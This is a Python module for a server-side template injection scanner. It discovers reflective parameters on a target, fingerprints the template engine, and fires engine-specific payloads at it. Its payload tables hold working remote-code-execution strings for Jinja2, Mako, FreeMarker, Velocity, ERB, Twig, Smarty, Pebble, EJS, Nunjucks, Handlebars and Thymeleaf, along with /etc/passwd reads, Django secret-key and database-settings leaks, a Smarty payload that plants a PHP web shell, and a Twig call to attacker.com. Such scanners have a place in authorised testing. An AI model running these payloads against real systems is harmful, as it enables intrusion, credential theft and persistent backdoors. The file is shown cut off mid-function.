# modules/ssti_scanner.py
import re
import time
import uuid
import random
import hashlib
import threading
import itertools
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# Engine detection + payload catalogue
# ---------------------------------------------------------------------------
#
# SSTI detection works in two phases:
#
#  Phase 1 — Polyglot probes: send expressions valid across multiple engines.
#             A numeric result (e.g. 49 from 7*7) or error fingerprint
#             tells us the engine without knowing it upfront.
#
#  Phase 2 — Engine-specific deep probes: once the engine is known, send
#             targeted payloads for RCE verification and data exfiltration.
#
# Engine map:
#   Jinja2 / Flask  -> Python
#   Mako            -> Python
#   Tornado         -> Python
#   Django          -> Python (limited evaluation)
#   Twig            -> PHP
#   Smarty          -> PHP
#   Blade           -> PHP (no native eval — limited)
#   Pebble          -> Java
#   Freemarker      -> Java
#   Velocity        -> Java
#   Thymeleaf       -> Java / Spring
#   Groovy          -> Java/Groovy
#   ERB             -> Ruby
#   Slim / Haml     -> Ruby
#   EJS / Pug       -> Node.js
#   Handlebars      -> Node.js
#   Nunjucks        -> Node.js
#   Dust.js         -> Node.js
# ---------------------------------------------------------------------------

@dataclass
class SSTIPayload:
    expression:  str            # raw payload string
    expected_re: str            # regex to match in reflected response
    engine:      str            # target engine (or "polyglot")
    phase:       int            # 1 = detect, 2 = confirm/exploit
    label:       str
    rce:         bool           # True if this payload attempts code execution
    severity:    str


# ── Phase 1 — polyglot detection ──────────────────────────────────────────

_POLYGLOT_MATH: List[SSTIPayload] = [
    # 7*7 = 49 — works in most engines
    SSTIPayload("{{7*7}}",          r"\b49\b",     "polyglot",   1, "math-jinja2-style",    False, "high"),
    SSTIPayload("${7*7}",           r"\b49\b",     "polyglot",   1, "math-dollar-brace",    False, "high"),
    SSTIPayload("#{7*7}",           r"\b49\b",     "polyglot",   1, "math-hash-brace",      False, "high"),
    SSTIPayload("*{7*7}",           r"\b49\b",     "polyglot",   1, "math-star-brace",      False, "high"),
    SSTIPayload("<%= 7*7 %>",       r"\b49\b",     "polyglot",   1, "math-erb-style",       False, "high"),
    SSTIPayload("{{7*'7'}}",        r"7777777",    "jinja2",     1, "jinja2-str-repeat",    False, "high"),
    SSTIPayload("{7*7}",            r"\b49\b",     "polyglot",   1, "math-curly-only",      False, "medium"),
    SSTIPayload("[[7*7]]",          r"\b49\b",     "polyglot",   1, "math-double-square",   False, "medium"),
    SSTIPayload("<%=7*7%>",         r"\b49\b",     "polyglot",   1, "math-erb-compact",     False, "high"),
    # Distinguish Jinja2 (49) from Twig ("49" vs "7777777")
    SSTIPayload("{{7*'7'}}",        r"7777777",    "jinja2",     1, "jinja2-vs-twig",       False, "high"),
    SSTIPayload("{{7*7}}",          r"\b49\b",     "twig",       1, "twig-math",            False, "high"),
]

_POLYGLOT_STRING: List[SSTIPayload] = [
    # String operations — engine-agnostic
    SSTIPayload('{{"artex"|upper}}',    r"ARTEX",  "jinja2",    1, "jinja2-filter-upper",  False, "high"),
    SSTIPayload('${{"artex"}}',         r"artex",  "freemarker",1, "freemarker-string",    False, "medium"),
    SSTIPayload('${"artex"?upper_case}',r"ARTEX",  "freemarker",1, "freemarker-upper",     False, "high"),
    SSTIPayload('{"artex".toUpperCase()}',r"ARTEX","velocity",  1, "velocity-upper",       False, "high"),
    SSTIPayload('#set($x="artex")${x}', r"artex",  "velocity",  1, "velocity-set",         False, "high"),
    SSTIPayload('{{"artex".toUpperCase()}}',r"ARTEX","pebble",  1, "pebble-upper",         False, "high"),
]

_POLYGLOT_ERROR: List[SSTIPayload] = [
    # Payloads that cause visible errors — engine name often in error message
    SSTIPayload("{{''.__class__}}",
                r"(class 'str'|type 'str'|<class)",         "jinja2",     1, "jinja2-class",    False, "high"),
    SSTIPayload("{{undefined}}",
                r"(UndefinedError|is undefined|not defined)", "jinja2",   1, "jinja2-undef",    False, "high"),
    SSTIPayload("${thisVarDoesNotExist}",
                r"(freemarker|ftl|templat)",                 "freemarker", 1, "fm-error",        False, "high"),
    SSTIPayload("<%= undefined_var %>",
                r"(NameError|undefined local variable)",      "erb",       1, "erb-nameerror",   False, "high"),
    SSTIPayload("{undefined_var}",
                r"(VariableNotFoundException|not defined)",   "velocity",  1, "velocity-err",    False, "high"),
    SSTIPayload("{{.foo}}",
                r"(cannot|error|Exception)",                  "handlebars",1, "hbs-error",       False, "medium"),
    SSTIPayload("{% debug %}",
                r"(TEMPLATE_DEBUG|template_debug|debug)",     "django",    1, "django-debug",    False, "medium"),
    SSTIPayload("{php}echo 1337;{/php}",
                r"1337",                                      "smarty",    1, "smarty-php",      False, "high"),
    SSTIPayload("{if 7*7}49{/if}",
                r"\b49\b",                                    "smarty",    1, "smarty-if",       False, "high"),
]


# ── Phase 2 — engine-specific deep / RCE payloads ─────────────────────────

_JINJA2_PAYLOADS: List[SSTIPayload] = [
    # Config object leak (Flask)
    SSTIPayload(
        "{{config}}",
        r"(SECRET_KEY|DEBUG|SQLALCHEMY|DATABASE)",
        "jinja2", 2, "jinja2-config-leak", False, "critical",
    ),
    # Class traversal to subprocess
    SSTIPayload(
        "{{''.__class__.mro()[1].__subclasses__()}}",
        r"(subprocess|Popen|os\.)",
        "jinja2", 2, "jinja2-subclasses", False, "critical",
    ),
    # RCE via os.popen — id command
    SSTIPayload(
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        r"root:x:0:0",
        "jinja2", 2, "jinja2-read-passwd", True, "critical",
    ),
    SSTIPayload(
        "{% for x in ().__class__.__base__.__subclasses__() %}"
        "{% if 'warning' in x.__name__ %}"
        "{{x()._module.__builtins__['__import__']('os').popen('id').read()}}"
        "{% endif %}{% endfor %}",
        r"uid=\d+",
        "jinja2", 2, "jinja2-rce-id", True, "critical",
    ),
    # Lipsum RCE (common bypass)
    SSTIPayload(
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        r"uid=\d+",
        "jinja2", 2, "jinja2-lipsum-rce", True, "critical",
    ),
    # Request.environ leak
    SSTIPayload(
        "{{request.environ}}",
        r"(GATEWAY_INTERFACE|SERVER_NAME|wsgi)",
        "jinja2", 2, "jinja2-environ", False, "high",
    ),
    # Cycler RCE
    SSTIPayload(
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        r"uid=\d+",
        "jinja2", 2, "jinja2-cycler-rce", True, "critical",
    ),
    # Namespace RCE (Jinja2 ≥2.10)
    SSTIPayload(
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        r"uid=\d+",
        "jinja2", 2, "jinja2-namespace-rce", True, "critical",
    ),
]

_MAKO_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "${__import__('os').popen('id').read()}",
        r"uid=\d+",
        "mako", 2, "mako-rce-id", True, "critical",
    ),
    SSTIPayload(
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
        r"uid=\d+",
        "mako", 2, "mako-block-rce", True, "critical",
    ),
    SSTIPayload(
        "${self._module.__dict__}",
        r"(__builtins__|__import__)",
        "mako", 2, "mako-module-dict", False, "high",
    ),
]

_FREEMARKER_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}',
        r"uid=\d+",
        "freemarker", 2, "fm-execute-rce", True, "critical",
    ),
    SSTIPayload(
        '${product.getClass().getProtectionDomain().getCodeSource().getLocation()}',
        r"(jar:|file:|classpath)",
        "freemarker", 2, "fm-classpath", False, "high",
    ),
    SSTIPayload(
        '<#assign classloader=product.class.protectionDomain.classLoader>'
        '<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>'
        '<#assign dwf=owc.newInstance()>${dwf("java.lang.ProcessBuilder",["id"])}',
        r"uid=\d+",
        "freemarker", 2, "fm-processbuilder-rce", True, "critical",
    ),
]

_VELOCITY_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        '#set($x=$class.inspect("java.lang.Runtime").type)'
        '#set($runtime=$x.getRuntime())'
        '#set($proc=$runtime.exec("id"))'
        '#set($null=$proc.waitFor())'
        '#foreach($i in [1..$null+1])'
        '$proc.text'
        '#end',
        r"uid=\d+",
        "velocity", 2, "velocity-runtime-rce", True, "critical",
    ),
    SSTIPayload(
        '#set($str=$class.inspect("java.lang.String").type)'
        '#set($chr=$class.inspect("java.lang.Character").type)'
        '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
        r"(java\.lang\.|Process|Runtime)",
        "velocity", 2, "velocity-class-inspect", False, "high",
    ),
]

_ERB_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "<%= `id` %>",
        r"uid=\d+",
        "erb", 2, "erb-backtick-rce", True, "critical",
    ),
    SSTIPayload(
        "<%= IO.popen('id').read %>",
        r"uid=\d+",
        "erb", 2, "erb-iopopen-rce", True, "critical",
    ),
    SSTIPayload(
        "<%= system('id') %>",
        r"uid=\d+",
        "erb", 2, "erb-system-rce", True, "critical",
    ),
    SSTIPayload(
        "<%= File.read('/etc/passwd') %>",
        r"root:x:0:0",
        "erb", 2, "erb-file-read", True, "critical",
    ),
]

_TWIG_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "{{_self.env.registerUndefinedFilterCallback('exec')}}"
        "{{_self.env.getFilter('id')}}",
        r"uid=\d+",
        "twig", 2, "twig-exec-rce", True, "critical",
    ),
    SSTIPayload(
        "{{['id']|filter('system')}}",
        r"uid=\d+",
        "twig", 2, "twig-filter-system", True, "critical",
    ),
    SSTIPayload(
        "{{_self.env.setCache('ftp://attacker.com')}}"
        "{{_self.env.loadTemplate('x')}}",
        r"(ftp:|failed|Exception)",
        "twig", 2, "twig-cache-ssrf", False, "high",
    ),
    SSTIPayload(
        "{{app.request.server.get('PATH')}}",
        r"(\/usr\/bin|\/bin|PATH=)",
        "twig", 2, "twig-env-path", False, "high",
    ),
]

_SMARTY_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "{php}echo shell_exec('id');{/php}",
        r"uid=\d+",
        "smarty", 2, "smarty-php-rce", True, "critical",
    ),
    SSTIPayload(
        "{system('id')}",
        r"uid=\d+",
        "smarty", 2, "smarty-system-rce", True, "critical",
    ),
    SSTIPayload(
        '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'
        '"<?php passthru($_GET[\'cmd\']);?>",self::clearConfig())}',
        r"(passthru|Smarty|writeFile)",
        "smarty", 2, "smarty-webshell", True, "critical",
    ),
]

_PEBBLE_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        '{% set cmd = "id" %}'
        '{% set bytes = (1).TYPE.forName("java.lang.Runtime")'
        '.methods[6].invoke(null,null) %}'
        '{% set exec = bytes.exec(cmd) %}'
        '{{ exec.text }}',
        r"uid=\d+",
        "pebble", 2, "pebble-runtime-rce", True, "critical",
    ),
]

_EJS_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "<%= process.env %>",
        r"(PATH|NODE|HOME|USER)=",
        "ejs", 2, "ejs-process-env", False, "high",
    ),
    SSTIPayload(
        "<%= require('child_process').execSync('id').toString() %>",
        r"uid=\d+",
        "ejs", 2, "ejs-execsync-rce", True, "critical",
    ),
]

_NUNJUCKS_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "{{range.constructor(\"return global.process.env\")()}}",
        r"(PATH|NODE|HOME)",
        "nunjucks", 2, "nunjucks-process-env", False, "high",
    ),
    SSTIPayload(
        "{{range.constructor(\"return require('child_process')"
        ".execSync('id').toString()\")()}}",
        r"uid=\d+",
        "nunjucks", 2, "nunjucks-rce", True, "critical",
    ),
]

_HANDLEBARS_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "{{#with \"s\" as |string|}}"
        "{{#with \"e\"}}"
        "{{#with split as |conslist|}}"
        "{{this.pop}}"
        "{{this.push (lookup string.sub \"constructor\")}}"
        "{{this.pop}}"
        "{{#with string.split as |codelist|}}"
        "{{this.pop}}"
        "{{this.push \"return require('child_process').execSync('id').toString();\"}}"
        "{{this.pop}}"
        "{{#each conslist}}"
        "{{#with (string.sub.apply 0 codelist)}}"
        "{{this}}"
        "{{/with}}"
        "{{/each}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}"
        "{{/with}}",
        r"uid=\d+",
        "handlebars", 2, "handlebars-rce", True, "critical",
    ),
]

_THYMELEAF_PAYLOADS: List[SSTIPayload] = [
    SSTIPayload(
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        r"uid=\d+",
        "thymeleaf", 2, "thymeleaf-spel-rce", True, "critical",
    ),
    SSTIPayload(
        "${T(java.lang.System).getenv()}",
        r"(PATH|JAVA_HOME|HOME)",
        "thymeleaf", 2, "thymeleaf-sysenv", False, "high",
    ),
]

_DJANGO_PAYLOADS: List[SSTIPayload] = [
    # Django templates have no eval — leak via built-in tags
    SSTIPayload(
        "{% debug %}",
        r"(TEMPLATE_DEBUG|template_debug|RequestContext)",
        "django", 2, "django-debug-tag", False, "medium",
    ),
    SSTIPayload(
        "{{ settings.SECRET_KEY }}",
        r"[a-zA-Z0-9!@#$%^&*]{10,}",
        "django", 2, "django-secret-key", False, "critical",
    ),
    SSTIPayload(
        "{{ settings.DATABASES }}",
        r"(ENGINE|NAME|USER|PASSWORD|HOST)",
        "django", 2, "django-db-settings", False, "critical",
    ),
]

# Engine → phase-2 payloads mapping
_ENGINE_PAYLOADS: Dict[str, List[SSTIPayload]] = {
    "jinja2":     _JINJA2_PAYLOADS,
    "mako":       _MAKO_PAYLOADS,
    "freemarker": _FREEMARKER_PAYLOADS,
    "velocity":   _VELOCITY_PAYLOADS,
    "erb":        _ERB_PAYLOADS,
    "twig":       _TWIG_PAYLOADS,
    "smarty":     _SMARTY_PAYLOADS,
    "pebble":     _PEBBLE_PAYLOADS,
    "ejs":        _EJS_PAYLOADS,
    "nunjucks":   _NUNJUCKS_PAYLOADS,
    "handlebars": _HANDLEBARS_PAYLOADS,
    "thymeleaf":  _THYMELEAF_PAYLOADS,
    "django":     _DJANGO_PAYLOADS,
}

# Engine detection fingerprints from error responses
_ENGINE_FINGERPRINTS: List[Tuple[str, str]] = [
    ("jinja2",      r"jinja2|TemplateSyntaxError|UndefinedError|jinja"),
    ("mako",        r"mako\.exceptions|mako\.template|MakoException"),
    ("freemarker",  r"freemarker\.|FreeMarker|ftl\.|freemarker\.core"),
    ("velocity",    r"org\.apache\.velocity|VelocityEngine|velocity\."),
    ("erb",         r"ActionView::Template::Error|erb\.rb|ERB::Compiler"),
    ("twig",        r"Twig_Error|twig\.error|Twig\\Error\\Syntax"),
    ("smarty",      r"Smarty_Compiler|SmartyException|smarty\.class\.php"),
    ("django",      r"django\.template|TemplateSyntaxError.*django|TEMPLATE_DEBUG"),
    ("pebble",      r"PebbleException|com\.mitchellbosecke\.pebble"),
    ("thymeleaf",   r"org\.thymeleaf|ThymeleafException|TemplateProcessingException"),
    ("handlebars",  r"Handlebars\.Exception|handlebars\.js|handlebars/dist"),
    ("nunjucks",    r"nunjucks\.Environment|Template render error.*nunjucks"),
    ("ejs",         r"ejs\.render|EJS|at eval.*ejs"),
    ("tornado",     r"tornado\.template|TemplateError.*tornado"),
    ("slim",        r"Slim::Template|slim\.rb"),
    ("haml",        r"Haml::Error|haml\.rb"),
]


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class SSTIFinding:
    url:              str
    parameter:        str
    method:           str             # GET / POST
    payload:          str
    engine_detected:  str
    phase:            int
    label:            str
    rce_confirmed:    bool
    severity:         str
    confidence:       str             # confirmed / likely / potential
    evidence:         str
    response_snippet: str
    cwe:              str
    cvss:             float


@dataclass
class EngineDetection:
    engine:     str
    confidence: str
    evidence:   str


@dataclass
class ScanState:
    target_url:       str
    discovered_params: Dict[str, List[str]]  # url → [param names]
    findings:         List[SSTIFinding] = field(default_factory=list)
    engine_cache:     Dict[str, EngineDetection] = field(default_factory=dict)
    lock:             threading.Lock   = field(default_factory=threading.Lock)


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[])
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=20,
        pool_maxsize=40,
    )
    session.mount("https://", adapter)
    session.mount("http://",  adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]


def _ua() -> str:
    return random.choice(_UA_POOL)


def _req(
    session: requests.Session,
    method: str,
    url: str,
    params: Optional[Dict] = None,
    data: Optional[Dict] = None,
    timeout: float = 8.0,
) -> Optional[requests.Response]:
    try:
        return session.request(
            method.upper(), url,
            params=params,
            data=data,
            headers={"User-Agent": _ua()},
            timeout=timeout,
            allow_redirects=True,
        )
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# Canary-based math verification
# ---------------------------------------------------------------------------

def _make_math_canary() -> Tuple[str, str, str]:
    """
    Return (expression_str, expected_result, canary_label).
    Uses random operands so the same probe never repeats in one session.
    """
    a = random.randint(10, 99)
    b = random.randint(10, 99)
    result = str(a * b)
    templates = [
        (f"{{{{{a}*{b}}}}}", result, "jinja2-style"),
        (f"${{{a}*{b}}}",    result, "dollar-brace"),
        (f"#{{{a}*{b}}}",    result, "hash-brace"),
        (f"<%= {a}*{b} %>",  result, "erb-style"),
        (f"*{{{a}*{b}}}",    result, "star-brace"),
    ]
    return random.choice(templates)


# ---------------------------------------------------------------------------
# Parameter discovery
# ---------------------------------------------------------------------------

_PARAM_WORDLIST = [
    "name", "q", "search", "query", "id", "user", "username", "email",
    "page", "title", "message", "text", "content", "template", "view",
    "file", "path", "url", "data", "input", "output", "lang", "locale",
    "format", "type", "category", "tag", "ref", "redirect", "next",
    "token", "key", "callback", "action", "mode", "debug", "test",
    "render", "tpl", "layout", "theme", "subject", "body", "comment",
    "description", "label", "value", "param", "arg", "variable",
]

_COMMON_PATHS = [
    "/", "/search", "/index.php", "/index.html", "/home",
    "/login", "/register", "/profile", "/contact", "/about",
    "/api/v1/render", "/api/render", "/api/v1/template",
    "/render", "/template", "/page", "/view",
    "/app/render", "/app/template",
]


def _discover_params(
    session: requests.Session,
    base_url: str,
    timeout: float,
    max_workers: int,
) -> Dict[str, List[str]]:
    """
    Discover URL + parameter combinations that reflect input.
    Returns {url: [param_names]} for all reflective endpoints.
    """
    result: Dict[str, List[str]] = {}
    base  = base_url.rstrip("/")
    probe = "ARTEX_PROBE_" + uuid.uuid4().hex[:6].upper()

    def _check_param(url: str, param: str) -> Optional[Tuple[str, str]]:
        resp = _req(session, "GET", url, params={param: probe}, timeout=timeout)
        if resp and probe in (resp.text or ""):
            return (url, param)
        # Also try POST
        resp = _req(session, "POST", url, data={param: probe}, timeout=timeout)
        if resp and probe in (resp.text or ""):
            return (url, param)
        return None

    tasks = list(itertools.product(
        [base + p for p in _COMMON_PATHS],
        _PARAM_WORDLIST,
    ))

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(_check_param, url, param): (url, param)
                   for url, param in tasks}
        for f in as_completed(futures):
            r = f.result()
            if r:
                url, param = r
                result.setdefault(url, []).append(param)

    return result


# ---------------------------------------------------------------------------
# Engine fingerprinting from response
# ---------------------------------------------------------------------------

def _fingerprint_engine(resp_text: str) -> Optional[EngineDetection]:
    """
    Match error messages or tell-tale response patterns to known engines.
    """
    for engine, pattern in _ENGINE_FINGERPRINTS:
        m = re.search(pattern, resp_text, re.I | re.S)
        if m:
            return EngineDetection(
                engine=engine,
                confidence="likely",
                evidence=m.group(0)[:80],
            )
    return None


def _infer_engine_from_payload(payload_label: str) -> str:
    """Infer engine from which polyglot payload succeeded."""
    if "jinja2" in payload_label:
        return "jinja2"
    if "erb" in payload_label:
        return "erb"
    if "freemarker" in payload_label or "fm-" in payload_label:
        return "freemarker"
    if "velocity" in payload_label:
        return "velocity"
    if "twig" in payload_label:
        return "twig"
    if "smarty" in payload_label:
        return "smarty"
    if "django" in payload_label:
        return "django"
    if "pebble" in payload_label:
        return "pebble"
    if "ejs" in payload_label or "nunjucks" in payload_label:
        return "nodejs"
    if "handlebars" in payload_label or "hbs" in payload_label:
        return "handlebars"
    if "thymeleaf" in payload_label:
        return "thymeleaf"
    return "unknown"


# ---------------------------------------------------------------------------
# Single-payload probe worker
# ---------------------------------------------------------------------------

def _probe_payload(
    session: requests.Session,
    url: str,
    param: str,
    method: str,
    payload_obj: SSTIPayload,
    timeout: float,
    rate_delay: float,
) -> Optional[SSTIFinding]:
    """
    Send one SSTI payload to one parameter.
    Returns SSTIFinding if the expected pattern matches, else None.
    """
    if rate_delay > 0:
        time.sleep(rate_delay)

    payload = payload_obj.expression
    if method == "GET":
        resp = _req(session, "GET", url, params={param: payload}, timeout=timeout)
    else:
        resp = _req(session, "POST", url, data={param: payload}, timeout=timeout)

    if resp is None:
        return None

    body = resp.text or ""
    m    = re.search(payload_obj.expected_re, body, re.I | re.S)
    if not m:
        return None

    snippet   = m.group(0)[:120]
    engine    = payload_obj.engine
    if engine == "polyglot":
        engine = _infer_engine_from_payload(payload_obj.label)

    # Try to get engine from error fingerprinting if still unknown
    if engine in ("unknown", "polyglot"):
        fp = _fingerprint_engine(body)
        if fp:
            engine = fp.engine

    confidence = "confirmed" if payload_obj.rce else "likely"

    return SSTIFinding(
        url=url,
        parameter=param,
        method=method,
        payload=payload,
        engine_detected=engine,
        phase=payload_obj.phase,
        label=payload_obj.label,
        rce_confirmed=payload_obj.rce,
        severity=payload_obj.severity,
        confidence=confidence,
        evidence=snippet,
        response_snippet=body[:300],
        cwe="CWE-94",
        cvss=9.8 if payload_obj.rce else 8.1,
    )


# ---------------------------------------------------------------------------
# Phase 1 — polyglot sweep
# ---------------------------------------------------------------------------

def _phase1_sweep(
    session: requests.Session,
    state: ScanState,
    timeout: float,
    rate_delay: float,
    max_workers: int,
) -> Dict[Tuple[str, str], str]:
    """
    Run all polyglot detection payloads across all discovered params.
    Returns {(url, param): detected_engine} for confirmed reflections.
    """
    all_p1 = _POLYGLOT_MATH + _POLYGLOT_STRING + _POLYGLOT_ERROR
    detections: Dict[Tuple[str, str], str] = {}

    tasks = [
        (url, param, method, pl)
        for url, params in state.discovered_params.items()
        for param in params
        for method in ("GET", "POST")
        for pl in all_p1
    ]

    lock = threading.Lock()

    def _run(task):
        url, param, method, pl = task
        return _probe_payload(session, url, param, method, pl, timeout, rate_delay)

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(_run, t) for t in tasks]
        for f in as_completed(futures):
            r = f.result()
            if r:
                key = (r.url, r.parameter)
                with lock:
                    state.findings.append(r)
                    if key not in detections:
                        detections[key] = r.engine_detected
                print(
                    f"  [P1][{r.engine_detected.upper():<12}] "
                    f"{r.url} param={r.parameter} "
                    f"label={r.label} evidence={r.evidence[:40]}"
                )

    return detections


# ---------------------------------------------------------------------------
# Phase 2 — engine-specific deep probes
# ---------------------------------------------------------------------------

def _phase2_deep(
    session: requests.Session,
    state: ScanState,
    detections: Dict[Tuple[str, str], str],
    timeout: float,
    rate_delay: float,
    max_workers: int,
) -> None:
    """
    For each confirmed (url, param, engine) triple from phase 1,
    run all engine-specific deep / RCE payloads.
    """
    tasks = []
    for (url, param), engine in detections.items():
        # Also run Jinja2 payloads when engine is unknown — most common
        engines_to_probe = {engine}
        if engine in ("unknown", "polyglot"):
            engines_to_probe = {"jinja2", "twig", "erb", "freemarker"}

        for eng in engines_to_probe:
            for pl in _ENGINE_PAYLOADS.get(eng, []):
                for method in ("GET", "POST"):
                    tasks.append((url, param, method, pl))

    lock = threading.Lock()

    def _run(task):
        url, param, method, pl = task
        return _probe_payload(session, url, param, method, pl, timeout, rate_delay)

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(_run, t) for t in tasks]
        for f in as_completed(futures):
            r = f.result()
            if r:
                with lock:
                    # Avoid duplicating phase-1 findings
                    existing_labels = {f.label for f in state.findings}
                    if r.label not in existing_labels:
                        state.findings.append(r)
                rce_flag = "[RCE]" if r.rce_confirmed else "     "
                print(
                    f"  [P2]{rce_flag}[{r.engine_detected.upper():<12}] "
                    f"param={r.parameter} label={r.label} "
                    f"evidence={r.evidence[:40]}"
                )


# ---------------------------------------------------------------------------
# Phase 3 — canary math verification
# ---------------------------------------------------------------------------

def _phase3_canary_verify(
    session: requests.Session,
    state: ScanState,
    detections: Dict[Tuple[str, str], str],
    timeout: float,
    rate_delay: float,
) -> None:
    """
    For each detected (url, param) pair, send a unique randomised math
    expression and verify the exact numeric result.
    This eliminates false positives from static-string reflection.
    """
    for (url, param), engine in detections.items():
        for _ in range(2):   # two independent canary rounds
            expr, expected, style = _make_math_canary()
            if rate_delay > 0:
                time.sleep(rate_delay)

            for method in ("GET", "POST"):
                resp = _req(
                    session, method, url,
                    params={param: expr} if method == "GET" else None,
                    data={param: expr}   if method == "POST" else None,
                    timeout=timeout,
                )
                if resp and re.search(r'\b' + re.escape(expected) + r'\b', resp.text or ""):
                    finding = SSTIFinding(
                        url=url,
                        parameter=param,
                        method=method,
                        payload=expr,
                        engine_detected=engine,
                        phase=3,
                        label=f"canary-math-{style}",
                        rce_confirmed=False,
                        severity="critical",
                        confidence="confirmed",
                        evidence=f"expr={expr} expected={expected} found in response",
                        response_snippet=(resp.text or "")[:200],
                        cwe="CWE-94",
                        cvss=9.0,
                    )
                    with state.lock:
                        # Only add if not already a confirmed finding for this param
                        if not any(
                            f.url == url and f.parameter == param
                            and f.phase == 3
                            for f in state.findings
                        ):
                            state.findings.append(finding)
                    print(
                        f"  [P3][CONFIRMED][{engine.upper():<10}] "
                        f"canary={expr}={expected} @ {url} param={param}"
                    )
                    break


# ---------------------------------------------------------------------------
# Blind SSTI detection (no direct reflection)
# ---------------------------------------------------------------------------

_BLIND_PAYLOADS: List[Tuple[str, str, float]] = [
    # (payload, label, expected_delay_s)
    ("{{''.__class__.__mro__[2].__subclasses__()[40]"
     "('/dev/urandom').read(1)}}",    "jinja2-read-urandom", 0),
    ("${T(java.lang.Thread).sleep(4000)}",
                                      "spel-sleep-4s",       4.0),
    ("#{T(java.lang.Thread).sleep(4000)}",
                                      "thymeleaf-sleep-4s",  4.0),
    ("<#assign ex='freemarker.template.utility.Execute'?new()>"
     "${ex(\"sleep 4\")}",            "freemarker-sleep-4s", 4.0),
    ("{{''.__class__.__mro__[2].__subclasses__()[59]"
     ".__init__.__globals__['__builtins__']['__import__']"
     "('time').sleep(4)}}",           "jinja2-sleep-4s",     4.0),
    ("<%= require('child_process').execSync('sleep 4') %>",
                                      "ejs-sleep-4s",        4.0),
]


def _blind_ssti_probe(
    session: requests.Session,
    state: ScanState,
    timeout: float,
    rate_delay: float,
    max_workers: int,
) -> None:
    """
    Time-based blind SSTI detection.
    For parameters that don't reflect output, a sleep-based payload
    causes a measurable response delay.
    """
    tasks = [
        (url, param, method, payload, label, delay)
        for url, params in state.discovered_params.items()
        for param in params
        for method in ("GET", "POST")
        for payload, label, delay in _BLIND_PAYLOADS
        if delay > 0
    ]

    def _run(task):
        url, param, method, payload, label, expected_delay = task
        if rate_delay > 0:
            time.sleep(rate_delay)

        # Baseline
        t0_base = time.monotonic()
        _req(session, method, url,
             params={param: "SAFE_PROBE"} if method == "GET" else None,
             data={param: "SAFE_PROBE"}   if method == "POST" else None,
             timeout=timeout)
        baseline = (time.monotonic() - t0_base) * 1000

        # Timed payload
        t0 = time.monotonic()
        _req(session, method, url,
             params={param: payload} if method == "GET" else None,
             data={param: payload}   if method == "POST" else None,
             timeout=max(timeout, expected_delay + 3))
        elapsed = (time.monotonic() - t0) * 1000

        delta = elapsed - baseline
        if delta >= (expected_delay * 1000 * 0.8):   # 80% of expected delay
            return SSTIFinding(
                url=url,
                parameter=param,
                method=method,
                payload=payload,
                engine_detected=_infer_engine_from_payload(label),
                phase=4,
                label=f"blind-{label}",
                rce_confirmed=False,
                severity="critical",
                confidence="likely",
                evidence=f"delay={delta:.0f}ms (expected≥{expected_delay*1000:.0f}ms baseline={baseline:.0f}ms)",
                response_snippet="",
                cwe="CWE-94",
                cvss=9.0,
            )
        return None

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = [ex.submit(_run, t) for t in tasks]
        for f in as_completed(futures):
            r = f.result()
            if r:
                with state.lock:
                    state.findings.append(r)
                print(
                    f"  [P4][BLIND][{r.engine_detected.upper():<10}] "
                    f"{r.label} @ {r.url} param={r.parameter} | {r.evidence[:60]}"
                )


# ---------------------------------------------------------------------------
# Deduplication and severity sorting
# ---------------------------------------------------------------------------

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
_CONF_ORDER = {"confirmed": 0, "likely": 1, "potential": 2, "none": 3}


def _dedup_sort(findings: List[SSTIFinding]) -> List[SSTIFinding]:
    """
    Deduplicate by (url, parameter, label).
    When two findings differ only in method, keep the confirmed one.
    Sort by severity, then confidence, then engine.
    """
    best: Dict[Tuple[str, str, str], SSTIFinding] = {}
    for f in findings:
        key = (f.url, f.parameter, f.label)
        if key not in best:
            best[key] = f
        else:
            existing = best[key]
            if _CONF_ORDER.get(f.confidence, 9) < _CONF_ORDER.get(existing.confidence, 9):
                best[key] = f

    unique = list(best.values())
    unique.sort(key=lambda f: (
        _SEV_ORDER.get(f.severity, 9),
